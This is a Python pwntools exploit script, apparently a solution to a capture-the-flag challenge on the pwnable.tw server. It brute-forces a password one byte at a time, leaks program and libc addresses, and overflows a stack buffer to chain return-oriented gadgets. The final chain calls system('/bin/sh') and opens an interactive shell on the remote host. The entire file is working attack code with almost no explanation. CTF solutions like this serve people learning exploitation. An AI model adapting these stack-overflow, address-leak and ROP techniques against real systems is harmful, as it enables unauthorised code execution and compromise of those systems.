#!/usr/bin/env python3

import pwn

pwn.context.arch = 'amd64'
pwn.context.terminal = ['tmux', 'splitw', '-h']

io = pwn.remote('chall.pwnable.tw', 10205)
libc = pwn.ELF('./libc_64.so.6')

# brute force password
def bf(num):
	password = b''
	for i in range(num):
		for c in range(256):
			if c == 0x00 or c == 0xa0:
				continue
			io.recvuntil(b'>> ')
			io.send(b'1AAAAAAAAAAAAAAA')
			io.recvuntil(b'Your passowrd :')
			io.sendline(password + bytes([c]))
			recv = io.recvuntil(b'!')
			if recv == b'Login Success !':
				password += bytes([c])
				io.recvuntil(b'>> ')
				io.send(b'1AAAAAAAAAAAAAAA')
				break
		else:
			raise RuntimeError
	return password

password = bf(38)
pie_leak = pwn.u64(password[32:40].ljust(8, b'\0'))
pie_base = pie_leak - 0x1060

password = password[0:16]

puts_plt = pie_base + 0xae0
puts_got = pie_base + 0x201f60
main = pie_base + 0xecf

def overwrite_stack(payload):
	io.recvuntil(b'>> ')
	io.send(b'1')
	io.recvuntil(b'Your passowrd :')
	io.send(payload)

	# validate authentication
	io.recvuntil(b'>> ')
	io.send(b'1')
	io.recvuntil(b'Your passowrd :')
	io.send(b'\n')

	# overwrite stack
	io.recvuntil(b'>> ')
	io.send(b'3')
	io.recvuntil(b'Copy :')
	io.send(b'B' * 63)

	io.recvuntil(b'>> ')
	io.send(b'1')
	
def build_rop(addr, num):
	# clear stack
	for i in range(7, 5, -1):
		overwrite_stack(b'A' * 64 + b'A' * (8 * num + i) + b'\n')
	overwrite_stack(b'A' * 64 + b'A' * (8 * num) + pwn.p64(addr)[0:6])

build_rop(puts_got, 7)
build_rop(main, 6)
build_rop(puts_plt, 5)
overwrite_stack(b'A' * 64 + password)

io.recvuntil(b'>> ')
io.send(b'1')
io.recvuntil(b'Your passowrd :')
io.send(b'\n')

io.recvuntil(b'>> ')
io.send(b'2')

libc_leak = pwn.u64(io.recv(6).ljust(8, b'\0'))
io.recvline() # get rid of newline character made by gets

libc_base = libc_leak - libc.sym[b'puts']
libc_base -= 0xa8
	
system = libc_base + libc.sym[b'system']
shell = libc_base + next(libc.search(b'/bin/sh'))
rdi = libc_base + 0x21102

io.recvuntil(b'>> ')
io.send(b'1')

password = bf(16)
build_rop(system, 7)
build_rop(shell, 6)
build_rop(rdi, 5)
overwrite_stack(b'A' * 64 + password)

io.recvuntil(b'>> ')
io.send(b'1')
io.recvuntil(b'Your passowrd :')
io.send(b'\n')

io.recvuntil(b'>> ')
io.send(b'2')

io.interactive()
